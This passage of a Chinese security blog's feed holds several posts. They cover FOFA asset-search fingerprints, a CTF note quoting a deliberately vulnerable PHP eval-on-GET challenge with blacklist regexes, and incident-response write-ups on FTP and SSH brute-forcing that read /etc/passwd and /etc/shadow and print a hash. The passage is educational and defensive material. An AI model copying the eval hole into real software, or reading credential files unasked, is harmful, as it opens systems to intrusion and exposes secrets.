HuaweiHomeGateway， TP-LINK无线路由器，</p><h3 id="云评论"><a href="#云评论" class="headerlink" title="云评论"></a>云评论</h3><p>uyan， disqus，</p><h3 id="统计模块"><a href="#统计模块" class="headerlink" title="统计模块"></a>统计模块</h3><p>google-analytics， cnzz， baidu统计， 51la， CNZZ统计， awstats_misc_tracker， advancedwebstats， hubspot， 51yes， Piwik，</p><h3 id="开发框架"><a href="#开发框架" class="headerlink" title="开发框架"></a>开发框架</h3><p>ThinkPHP， Swiftlet， Aspnetmvc， CodeIgniter， ColdFusion， WebObjects， cakephp， Django， zikula_framework， NetteFramework， Fat-FreeFramework， Play-Framework， Restlet-Framework， Kohana-Framework， flow_framework， SIMIT_framework， axis2-web，</p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>mongodb， elasticsearch， phpMyadmin， MVB2000， GPSweb， Tumblr， phpinfo， AD<em>RS设备， FrontPageServerExtension， 认证页面， TCN协议， sharepoint， MS-Author-Via， 3COM_NBX， wspx， rack-cache， Dnnoutputcache， Iisexport， Oraclea-DMS， P3p_enabled， X-72e-Nobeian-Transfer， ManagedFusion， Adblock， Blackboard， LiquidGIS， Cocoon， Wp-Super-Cache， pagespeed， Alternate-Protocol， unbouncepages， lemis管理系统， OpenSSL， mod_bwlimited， mod_auth_passthrough， FreeboxOS， SMA_Sunny_Webbox， Wimax_CPE， Aethra_Telecommunications_Operating_System， Scientific-Atlanta_Cable_Modem， rap， ZTE_MiFi_UNE， 用友商战实践平台， moosefs， AirLink_modem， CCProxy， APC_Management， HuaweiHomeGateway， TP-LINK无线路由器， 蓝盾BDWebGuard， 护卫神网站安全系统， phpDocumentor， ColdFusion， Adobe</em> CQ5， Adobe_GoLive， Adobe_RoboHelp， Amaya， PHP-CGI， Synology_NAS， OpenMas， __VIEWSTATE， Chromelogger， Communique， recaptcha， IPFire， TerraMaster， 创星伟业校园网群， 正方教务管理系统， UFIDA_NC， 北创图书检索系统， Facebook_insights， squarespace建站， Bad_Behavior， Azure_ARR， Tncms， 北京清科锐华CEMIS， RG-PowerCache内容加速系统， dayrui系列产品， Privoxy代理， wordpress_qTranslate， DVWA， sugon_gridview， blog_fc2， LiteSpeed_Web_Admin_Console， SLTM32_Configuration， SHOUTcast， Piwigo， seeyoo广告机， milu_seotool， Moxa Nport串口服务器， CISCO_EPC3925， CASino， metasploit，</p><h3 id="SSL证书"><a href="#SSL证书" class="headerlink" title="SSL证书"></a>SSL证书</h3><p>thawte_ssl_cert， wosign_ssl_cert， webtrust_cert， globalsign_cert， GeoTrust_cert，</p><h3 id="安全检测平台"><a href="#安全检测平台" class="headerlink" title="安全检测平台"></a>安全检测平台</h3><p>360网站安全检测， teamportal，</p><h3 id="项目管理"><a href="#项目管理" class="headerlink" title="项目管理"></a>项目管理</h3><p>jira， fisheye， VisualSVN， Redmine， zentao， Bugzilla， Phabricator， reviewboard， Hudson， Jenkins， testlink， trac， gitlab， mantis， Mercurial，</p><h3 id="服务器管理"><a href="#服务器管理" class="headerlink" title="服务器管理"></a>服务器管理</h3><p>LuManager， 主机宝， wdcp管理系统， LANMP一键安装包， UPUPW， wamp， easypanel， awstats_admin， awstats， uPlusFtp， Cactiez， Cacti， CrushFTP， HFS， WHM， moosefs， LUM服务器管理， 护卫神主机管理， cpanel， bacula-web， Webmin， Directadmin， Synology_DiskStation， Puppet_Node_Manager，</p><h3 id="企业管理"><a href="#企业管理" class="headerlink" title="企业管理"></a>企业管理</h3><p>易瑞授权访问系统， MVB2000， SonicWALL， NetShare<em>VPN， pmway_E4_crm， srun3000计费认证系统， Dolibarr， Parallels Plesk Panel， EasyTrace(botwave)， 管理易， 亿赛通DLP， huawei_auth_server， 瑞友天翼</em>应用虚拟化系统 ， Vmware_vFabric， ICEFLOW_VPN， 360企业版， 用友erp-nc， 深信服ssl-vpn， 天融信VPN， Array_Networks_VPN， 天融信防火墙， o2security_vpn， zabbix， juniper_vpn， F5_BIGIP， CEMIS， DI-804HV， CCProxy， 梭子鱼设备， Synology_NAS， zenoss， Splunk， OpenMas， Ultra_Electronics， NOALYSS， Nagios， ALCASAR， orocrm， Adiscon_LogAnalyzer， Munin， opennms， MRTG， ganglia， 元年财务软件， UFIDA_NC， Webmin， 锐捷应用控制引擎， Storm， 网神VPN， FortiWeb， Centreon， FortiGuard， PineApp， ntop， CDR-Stats， GenieATM， Spark_Worker， Spark_Master， Kibana， CISCO_VPN， UcSTAR， i@Report， 帕拉迪统一安全管理和综合审计系统， openEAP， Dorado， 金龙卡金融化一卡通网站查询子系统， 一采通， 埃森诺网络服务质量检测系统， 惠尔顿上网行为管理系统， ACSNO网络探针， 绿盟下一代防火墙， 用友U8， 华为_HUAWEI_SRG1220， 华为_HUAWEI_SRG2220， 华为_HUAWEI_ASG2100， 华为_HUAWEI_SRG3250， 华为_HUAWEI_ASG2050， 华为（HUAWEI）安全设备， 华为（HUAWEI）Secoway设备， Fireeye，</p><h3 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h3><p>蓝讯， 网宿， 帝联， 快网， Webluker， 西部数码， gocdn， Powercdn， Akamai， QingCloud， amazon-cloudfront，</p><h3 id="Web服务器"><a href="#Web服务器" class="headerlink" title="Web服务器"></a>Web服务器</h3><p>Sun[tm]， ZendServer， squid， JBoss<em>AS， oracle_applicaton_server， IIS， nginx， tomcat， Apache， Tengine， IBM_HTTP_Server， GSE， LiteSpeed， Microsoft-HTTPAPI， ngx_openresty， Zeus， Resin， Netscape-Enterprise， Phusion， webrick， Jetty， Sun-ONE-Web-Server， Oracle-Application-Server， JBoss， kangle反向代理， Varnish， Aicache， SJSWS</em> OiWS， AOLserver， Lotus-Domino， gunicorn， Allegro-Software-RomPager， Starlet， nginx_admin， FortiWeb， GlassFish， Privoxy， 东方通应用服务器TongWeb， Mbedthis-Appweb，</p><h3 id="网站防火墙WAF"><a href="#网站防火墙WAF" class="headerlink" title="网站防火墙WAF"></a>网站防火墙WAF</h3><p>一启快， 360主机卫士， 安全狗， Websecurity_WAF， webray， weidun， 安慧网盾， Safe3WAF， AnZuWAF， DnP Firewall， Kerio_WinRoute_Firewall， Dotdefender， Citrix_Netscaler， Mod_Security， PaloAlto_Firewall， WebKnight， Sucuri， 梭子鱼防火墙， 云锁，</p><h3 id="路由器-1"><a href="#路由器-1" class="headerlink" title="路由器"></a>路由器</h3><p>dd-wrt， 锐捷NBR路由器， mikrotik， 中兴路由器， h3c路由器， jcg无线路由器， Comcast_Business_Gateway， AirLink_modem，</p><h3 id="CMS"><a href="#CMS" class="headerlink" title="CMS"></a>CMS</h3><p>phpshe， ThinkSAAS， e-tiller， DouPHP， twcms， SiteServer， Joomla， HDWiki， kesionCMS， CMSTop， ESPCMS， 74cms， Foosun， PhpCMS， Hanweb， Drupal， cmseasy， wordpress， DedeCMS， ASPCMS， MetInfo， Npoint， 小蚂蚁， 捷点JCMS， 帝国EmpireCMS， JEECMS， emlog， IdeaCMS， TCCMS， DIYWAP， supesite， webplus， Dolibarr， ExpressionEngine， iAPPS， Liferay， Telerik Sitefinity， PageAdmin， sdcms， EnterCRM， 易普拉格科研管理系统， 苏亚星校园管理系统， 313自助建站， trs<em>wcm， we7， 1024cms， 360webfacil_360WebManager， 6kbbs， ABO_CMS， Acidcat_CMS， bit-service， 云因网上书店， DotNetNuke， plone， Kooboocms， unknown_cms， chanzhi， unknown_cms_rcms， MediaWiki， Typecho， Z-Blog， Z-BlogPHP， EleanorCMS， BitrixSiteManager， FOXI BIZzz， BPanelCMS， SubrionCMS， WMSN， TwilightCMS， TechartCMS， 2z project， phpDocumentor， 微门户， Osclass， webEdition， orocrm， 创星伟业校园网群， BoyowCMS， 正方教务管理系统， UFIDA_NC， phpweb， weebly， 地平线CMS， HIMS酒店云计算服务， Tipask， 北创图书检索系统， squarespace建站， 微普外卖点餐系统， 逐浪zoomla， Zikula_CMS， mozartframework， UMI.CMS， EasywebCMS， synkronvia， sitecore， MuraCMS， irecms， typo3， SamanPortal， 北京清科锐华CEMIS， ThinkSNS， asp168欧虎， 擎天电子政务， easysite， 北京阳光环球建站系统， MaticsoftSNS</em>动软分享社区， FineCMS， Diferior， DokuWiki， WebsiteBaker-CMS， concrete5， 国家数字化学习资源中心系统， 某通用型政府cms， PigCms， 天柏在线培训/考试系统， 万户网络， rcms， 全国烟草系统， O2OCMS， 一采通，</p><h3 id="视频监控"><a href="#视频监控" class="headerlink" title="视频监控"></a>视频监控</h3><p>EdmWebVideo， iDVR， edvr， AVCON6， Polycom， Plesk， techbridge， NETSurveillance， 海康威视（Hikvision）， nvdvr， DVR camera， TRSMAS， Macrec_DVR， Aethra_Telecommunications_Operating_System， ECOR， MOBOTIX_Camera， OnSSI_Video_Clients， Linksys_SPA_Configuration ， eagleeyescctv， dasannetworks， 海康威视iVMS， 佳能网络摄像头(Canon Network Cameras)， NetDvrV3，</p><h3 id="网站云防护"><a href="#网站云防护" class="headerlink" title="网站云防护"></a>网站云防护</h3><p>cloudflare， 加速乐， Incapsula， 百度云加速， 360网站卫士， 安全宝， BinarySec， Sucuri， NetteFramework，</p><h3 id="论坛社区"><a href="#论坛社区" class="headerlink" title="论坛社区"></a>论坛社区</h3><p>phpbb， phpwind， discuz， vBulletin， 6kbbs， IP.Board，</p><h3 id="邮件系统"><a href="#邮件系统" class="headerlink" title="邮件系统"></a>邮件系统</h3><p>fangmail， 腾讯企业邮箱， MDaemon， 亿邮， 网易企业邮箱， TurboMail， magicwinmail， 万网企业云邮箱， bxemail， Coremail， imailserver， exchange， Zimbra， Lotus， Roundcube， Horde， Atmail， iGENUS_webmail， anymacro， mirapoint， iredadmin(Roundcube?)， SquirrelMail， U-Mail， ExtMail， Spammark邮件信息安全网关，</p><h3 id="站长平台"><a href="#站长平台" class="headerlink" title="站长平台"></a>站长平台</h3><p>360站长平台， baidu站长平台， google站长平台， sogou站长平台，</p><h3 id="电商系统"><a href="#电商系统" class="headerlink" title="电商系统"></a>电商系统</h3><p>Zen Cart， ECShop， Shop7Z， 同城多用户商城， iWebShop， eaststorecreeator， buscape， 1und1， 3DCART， cart<em>engine， Magento， OpenCart， ECMall， PrestaShop， Bigcommerce， TinyShop， hishop， Maticsoft_Shop</em>动软商城， shopify， hikashop，</p><h3 id="OA系统"><a href="#OA系统" class="headerlink" title="OA系统"></a>OA系统</h3><p>华天动力OA(OA8000)， 通达OA， OA(a8/seeyon/ufida)， yongyoufe， pmway_E4_crm， Dolibarr， PHPOA， 78oa， WishOA， 金和协同管理平台， 泛微协同办公OA， 万户ezOFFICE， ranzhi， Zimbra， Lotus， OA企业智能办公自动化系统， ecwapoa， ezOFFICE，</p><h2 id="3、使用场景"><a href="#3、使用场景" class="headerlink" title="3、使用场景"></a>3、使用场景</h2><p>例如Apache出来了一个高危漏洞，受影响的版本号为2.4.23,我们需要去本公司可能受此漏洞影响的Apache服务器，那么我们可以使用高级查询语句server==”Apache/2.4.23”&amp;&amp;domain=”xxx.com”，搜索结果即为本公司域名下的所有子域名可能存在Apache2.4.23版本漏洞的URL，安全人员可以对结果进行检查，及时修复漏洞。</p><h1 id="三、FOFA的特点"><a href="#三、FOFA的特点" class="headerlink" title="三、FOFA的特点"></a>三、FOFA的特点</h1><h2 id="1-支持API查询接口，便于进行程序间的自动化查询、处理功能，进行进一步的业务分析"><a href="#1-支持API查询接口，便于进行程序间的自动化查询、处理功能，进行进一步的业务分析" class="headerlink" title="1.支持API查询接口，便于进行程序间的自动化查询、处理功能，进行进一步的业务分析"></a>1.支持API查询接口，便于进行程序间的自动化查询、处理功能，进行进一步的业务分析</h2><p>用法如下：</p><p>所有调用都需要提供身份信息，主要是email和key，email主要是注册和登陆时填写的email，key需要用户到个人中心获取32位的hash值，即为API KEY。将上面的两个信息填入api接口中，即可获取json格式的数据。</p><h2 id="2-支持下载功能"><a href="#2-支持下载功能" class="headerlink" title="2.支持下载功能"></a>2.支持下载功能</h2><p>搜索到结果之后可在右侧选择下载功能，可下载搜索到的所有数据，下载的格式支持CSV，JSON，XML格式，方便程序调用进行全网扫描。</p>]]></content>
    
    
    <summary type="html">Fofa</summary>
    
    
    
    <category term="渗透测试" scheme="https://github.com/Eviden0/new-webpage/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
  </entry>
  
  <entry>
    <title>SQL注入之Quine注入</title>
    <link href="https://github.com/Eviden0/new-webpage/posts/4361ef96.html"/>
    <id>https://github.com/Eviden0/new-webpage/posts/4361ef96.html</id>
    <published>2024-06-17T03:49:00.000Z</published>
    <updated>2024-07-08T10:01:57.796Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><a href="https://www.anquanke.com/post/id/253570#h2-9">从三道赛题再谈Quine trick-安全客 - 安全资讯平台 (anquanke.com)</a></p><p><a href="https://blog.csdn.net/qq_35782055/article/details/130348274">sql注入 Quine注入解析_char(46)-CSDN博客</a></p></blockquote>]]></content>
    
    
    <summary type="html">HardSQL</summary>
    
    
    
    <category term="CTF" scheme="https://github.com/Eviden0/new-webpage/categories/CTF/"/>
    
    
    <category term="SQL注入" scheme="https://github.com/Eviden0/new-webpage/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>6-15记录</title>
    <link href="https://github.com/Eviden0/new-webpage/posts/10b0751c.html"/>
    <id>https://github.com/Eviden0/new-webpage/posts/10b0751c.html</id>
    <published>2024-06-15T13:49:00.000Z</published>
    <updated>2024-07-08T10:01:57.794Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><strong>[GXYCTF 2019]禁止套娃</strong></p></blockquote><ol><li><p>扫目录发现了<code>.git</code>, 403不要紧, 试试<code>.git/HEAD</code>能不能访问</p></li><li><p>如果能访问, 用<code>git-dumper</code>等工具下载<code>git</code>目录</p></li><li><p><img src="https://gitee.com/eviden/img/raw/master/202406152205960.png" alt="image-20240615220521855"></p></li></ol><p>代码审计:<code>典型的无参数RCE</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">6-15记录</summary>
    
    
    
    <category term="CTF" scheme="https://github.com/Eviden0/new-webpage/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>Emergency-Response-Notes README</title>
    <link href="https://github.com/Eviden0/new-webpage/posts/c50485dc.html"/>
    <id>https://github.com/Eviden0/new-webpage/posts/c50485dc.html</id>
    <published>2024-06-13T05:10:00.000Z</published>
    <updated>2024-06-13T05:55:41.935Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://bypass007.github.io/Emergency-Response-Notes/Summary/image/sum-title.png" alt=""></p><p>GitHub  地址：<a href="https://github.com/Bypass007/Emergency-Response-Notes">https://github.com/Bypass007/Emergency-Response-Notes</a></p><p>GitBook 地址：<a href="https://bypass007.github.io/Emergency-Response-Notes/">https://bypass007.github.io/Emergency-Response-Notes/</a></p><h3 id="项目介绍"><a href="#项目介绍" class="headerlink" title="项目介绍"></a>项目介绍</h3><p>面对各种各样的安全事件，我们该怎么处理？</p><p>这是一个关于安全事件应急响应的项目，从系统入侵到事件处理，收集和整理了一些案例进行分析。</p><p>我将持续更新这份笔记，希望能帮到有需要的人。</p><p>如果你看到好的案例，欢迎通过issue提交。</p><h3 id="项目目录"><a href="#项目目录" class="headerlink" title="项目目录"></a>项目目录</h3><ul><li><p><strong>[第一章：入侵排查篇]</strong></p><ul><li><p>第1篇：Window入侵排查</p></li><li><p>第2篇：Linux入侵排查</p></li><li><p>第3篇：常见的Webshell查杀工具</p></li><li><p>第4篇：如何发现隐藏的Webshell后门</p></li><li><p>第5篇：勒索病毒自救指南</p></li></ul></li><li><p><strong>[第二章：日志分析篇]</strong></p><ul><li><p>第1篇:Window日志分析</p></li><li><p>第2篇:Linux日志分析 </p></li><li><p>第3篇:Web日志分析</p></li><li><p>第4篇:MSSQL日志分析 </p></li><li><p>第5篇:MySQL日志分析</p></li></ul></li><li><p><strong>[第三章：权限维持篇]</strong></p><ul><li><p>第1篇：Windows权限维持—隐藏篇</p></li><li><p>第2篇：Windows权限维持—后门篇</p></li><li><p>第3篇：Linux权限维持—隐藏篇</p></li><li><p>第4篇：Linux权限维持—后门篇</p></li><li><p>第5篇：Windows命令行文件下载方式汇总</p></li><li><p>第6篇：三大渗透测试框架权限维持技术</p></li><li><p>第7篇：常见WebShell管理工具</p></li></ul></li><li><p><strong>[第四章:Windows实战篇]</strong></p><ul><li><p>第1篇：FTP暴力破解</p></li><li><p>第2篇：蠕虫病毒</p></li><li><p>第3篇：勒索病毒</p></li><li><p>第4篇：ARP病毒</p></li><li><p>第5篇：挖矿病毒（一）</p></li><li><p>第6篇：挖矿病毒（二）</p></li></ul></li><li><p><strong>[第五章：Linux实战篇]</strong></p><ul><li><p>第1篇：SSH暴力破解</p></li><li><p>第2篇：捕捉短连接</p></li><li><p>第3篇：挖矿病毒</p></li><li><p>第4篇：盖茨木马</p></li><li><p>第5篇：DDOS病毒</p></li><li><p>第6篇：Shell病毒</p></li></ul></li><li><p><strong>[第六章：Web实战篇]</strong></p><ul><li><p>第1篇：网站被植入Webshell</p></li><li><p>第2篇：门罗币恶意挖矿</p></li><li><p>第3篇：批量挂黑页</p></li><li><p>第4篇：新闻源网站劫持</p></li><li><p>第5篇：移动端劫持</p></li><li><p>第6篇：搜索引擎劫持</p></li><li><p>第7篇：网站首页被篡改</p></li><li><p>第8篇：管理员账号被篡改</p></li><li><p>第9篇：编辑器入侵事件</p></li></ul></li></ul><hr><h3 id="学习交流"><a href="#学习交流" class="headerlink" title="学习交流"></a>学习交流</h3><p>后续持续更新内容，将发布在公众号Bypass—，同时公众号提供了该项目的PDF版本，关注后回复”应急响应” 即可下载。</p><p><img src="https://bypass007.github.io/Emergency-Response-Notes/Summary/image/sum-erweima.jpg" alt=""></p>]]></content>
    
    
    <summary type="html">学习应急响应咯!</summary>
    
    
    
    <category term="渗透测试" scheme="https://github.com/Eviden0/new-webpage/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="应急响应" scheme="https://github.com/Eviden0/new-webpage/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>第04章_Windows实战篇第1篇_FTP暴力破解</title>
    <link href="https://github.com/Eviden0/new-webpage/posts/d61eb2b.html"/>
    <id>https://github.com/Eviden0/new-webpage/posts/d61eb2b.html</id>
    <published>2024-06-13T05:10:00.000Z</published>
    <updated>2024-06-13T06:28:00.706Z</updated>
    
    <content type="html"><![CDATA[<h2 id="第1篇：FTP暴力破解"><a href="#第1篇：FTP暴力破解" class="headerlink" title="第1篇：FTP暴力破解"></a>第1篇：FTP暴力破解</h2><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>​    FTP是一个文件传输协议，用户通过FTP可从客户机程序向远程主机上传或下载文件，常用于网站代码维护、日常源码备份等。如果攻击者通过FTP匿名访问或者弱口令获取FTP权限，可直接上传webshell，进一步渗透提权，直至控制整个网站服务器。</p><h3 id="0x01-应急场景"><a href="#0x01-应急场景" class="headerlink" title="0x01 应急场景"></a>0x01 应急场景</h3><p>​    从昨天开始，网站响应速度变得缓慢，网站服务器登录上去非常卡，重启服务器就能保证一段时间的正常访问，网站响应状态时而飞快时而缓慢，多数时间是缓慢的。针对网站服务器异常，系统日志和网站日志，是我们排查处理的重点。查看Window安全日志，发现大量的登录失败记录：</p><p><img src="image/win-5-1.png" alt=""></p><h3 id="0x02-日志分析"><a href="#0x02-日志分析" class="headerlink" title="0x02 日志分析"></a>0x02 日志分析</h3><p><strong>安全日志分析：</strong> </p><p>安全日志记录着事件审计信息，包括用户验证（登录、远程访问等）和特定用户在认证后对系统做了什么。</p><p>打开安全日志，在右边点击筛选当前日志， 在事件ID填入4625，查询到事件ID4625，事件数177007，从这个数据可以看出，服务器正则遭受暴力破解：</p><p><img src="image/win-5-2.png" alt=""></p><p>进一步使用Log Parser对日志提取数据分析，发现攻击者使用了大量的用户名进行爆破，例如用户名：fxxx，共计进行了17826次口令尝试，攻击者基于“fxxx”这样一个域名信息，构造了一系列的用户名字典进行有针对性进行爆破，如下图：</p><p><img src="image/win-5-3.png" alt=""></p><p>这里我们留意到登录类型为8，来了解一下登录类型8是什么意思呢？</p><p><strong>登录类型8：网络明文（NetworkCleartext）</strong>   </p><p>这种登录表明这是一个像类型3一样的网络登录，但是这种登录的密码在网络上是通过明文传输的，WindowsServer服务是不允许通过明文验证连接到共享文件夹或打印机的，据我所知只有当从一个使用Advapi的ASP脚本登录或者一个用户使用基本验证方式登录IIS才会是这种登录类型。“登录过程”栏都将列出Advapi。  </p><p>我们推测可能是FTP服务，通过查看端口服务及管理员访谈，确认服务器确实对公网开放了FTP服务。</p><p><img src="image/win-5-4.png" alt=""></p><p>另外，日志并未记录暴力破解的IP地址，我们可以使用Wireshark对捕获到的流量进行分析，获取到正在进行爆破的IP：</p><p><img src="image/win-5-5.png" alt=""></p><p>通过对近段时间的管理员登录日志进行分析，如下：</p><p><img src="image/win-5-6.png" alt=""></p><p>管理员登录正常，并未发现异常登录时间和异常登录ip，这里的登录类型10，代表远程管理桌面登录。</p><p>另外，通过查看FTP站点，发现只有一个测试文件，与站点目录并不在同一个目录下面，进一步验证了FTP暴力破解并未成功。</p><p><img src="image/win-5-7.png" alt=""></p><p>应急处理措施：1、关闭外网FTP端口映射           2、删除本地服务器FTP测试</p><h3 id="0x04-处理措施"><a href="#0x04-处理措施" class="headerlink" title="0x04 处理措施"></a>0x04 处理措施</h3><p>​    FTP暴力破解依然十分普遍，如何保护服务器不受暴力破解攻击，总结了几种措施：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1</span>、禁止使用FTP传输文件，若必须开放应限定管理IP地址并加强口令安全审计（口令长度不低于<span class="number">8</span>位，由数字、大小写字母、特殊字符等至少两种以上组合构成）。</span><br><span class="line"><span class="attribute">2</span>、更改服务器FTP默认端口。</span><br><span class="line"><span class="attribute">3</span>、部署入侵检测设备，增强安全防护。</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">学习应急响应咯!</summary>
    
    
    
    <category term="渗透测试" scheme="https://github.com/Eviden0/new-webpage/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="应急响应" scheme="https://github.com/Eviden0/new-webpage/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>第05章：Linux实战篇第1篇：SSH暴力破解</title>
    <link href="https://github.com/Eviden0/new-webpage/posts/e4068ec3.html"/>
    <id>https://github.com/Eviden0/new-webpage/posts/e4068ec3.html</id>
    <published>2024-06-13T05:10:00.000Z</published>
    <updated>2024-06-13T06:21:22.610Z</updated>
    
    <content type="html"><![CDATA[<h2 id="第1篇：SSH暴力破解"><a href="#第1篇：SSH暴力破解" class="headerlink" title="第1篇：SSH暴力破解"></a>第1篇：SSH暴力破解</h2><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>​    SSH 是目前较可靠，专为远程登录会话和其他网络服务提供安全性的协议，主要用于给远程登录会话数据进行加密，保证数据传输的安全。SSH口令长度太短或者复杂度不够，如仅包含数字，或仅包含字母等，容易被攻击者破解，一旦被攻击者获取，可用来直接登录系统，控制服务器所有权限。</p><h3 id="0x01-应急场景"><a href="#0x01-应急场景" class="headerlink" title="0x01 应急场景"></a>0x01 应急场景</h3><p>​    某天，网站管理员登录服务器进行巡检时，发现端口连接里存在两条可疑的连接记录，如下图：</p><p><img src="https://gitee.com/eviden/img/raw/master/202406131419092.png" alt=""></p><ol><li><p>TCP初始化连接三次握手吧：发SYN包，然后返回SYN/ACK包，再发ACK包，连接正式建立。但是这里有点出入，当请求者收到SYS/ACK包后，就开始建立连接了，而被请求者第三次握手结束后才建立连接。</p></li><li><p>客户端TCP状态迁移：</p><p>​    CLOSED-&gt;SYN_SENT-&gt;ESTABLISHED-&gt;FIN_WAIT_1-&gt;FIN_WAIT_2-&gt;TIME_WAIT-&gt;CLOSED</p><p>服务器TCP状态迁移：</p><p>​    CLOSED-&gt;LISTEN-&gt;SYN recv-&gt;ESTABLISHED-&gt;CLOSE_WAIT-&gt;LAST_ACK-&gt;CLOSED</p></li><li><p>当客户端开始连接时，服务器还处于LISTENING，客户端发一个SYN包后，服务端接收到了客户端的SYN并且发送了ACK时，服务器处于SYN_RECV状态，然后并没有再次收到客户端的ACK进入ESTABLISHED状态，一直停留在SYN_RECV状态。</p><p>在这里，SSH（22）端口，两条外网IP的SYN_RECV状态连接，直觉告诉了管理员，这里一定有什么异常。</p></li></ol><h3 id="0x02-日志分析"><a href="#0x02-日志分析" class="headerlink" title="0x02 日志分析"></a>0x02 日志分析</h3><p>​    SSH端口异常，我们首先有必要先来了解一下系统账号情况：</p><p><strong>A、系统账号情况</strong></p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="operator">、</span>除root之外，是否还有其它特权用户(uid 为<span class="number">0</span>)</span><br><span class="line">[root<span class="meta">@localhost</span> <span class="operator">~</span>]# awk <span class="operator">-</span><span class="type">F</span>: &#x27;<span class="variable">$3</span><span class="operator">==</span><span class="number">0</span>&#123;print <span class="variable">$1</span>&#125;&#x27; <span class="regexp">/etc/</span>passwd</span><br><span class="line">root</span><br><span class="line"></span><br><span class="line"><span class="number">2</span><span class="operator">、</span>可以远程登录的帐号信息</span><br><span class="line">[root<span class="meta">@localhost</span> <span class="operator">~</span>]# awk &#x27;<span class="regexp">/\$1|\$6/</span>&#123;print <span class="variable">$1</span>&#125;&#x27; <span class="regexp">/etc/</span>shadow</span><br><span class="line">root:<span class="variable">$6</span><span class="variable">$38</span>cKfZDjsTiUe58V<span class="variable">$FP</span>.<span class="type">UHWMObqeUQS1Z2KRj</span><span class="regexp">/4EEcOPi.6d1XmKHgK3j3GY9EGvwwBei7nUbbqJC./</span>qK12HN8jFuXOfEYIKLID6hq0::<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br></pre></td></tr></table></figure><p>我们可以确认目前系统只有一个管理用户root。</p><p>接下来，我们想到的是/var/log/secure，这个日志文件记录了验证和授权方面的信息，只要涉及账号和密码的程序都会记录下来。</p><p><strong>B、确认攻击情况：</strong></p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 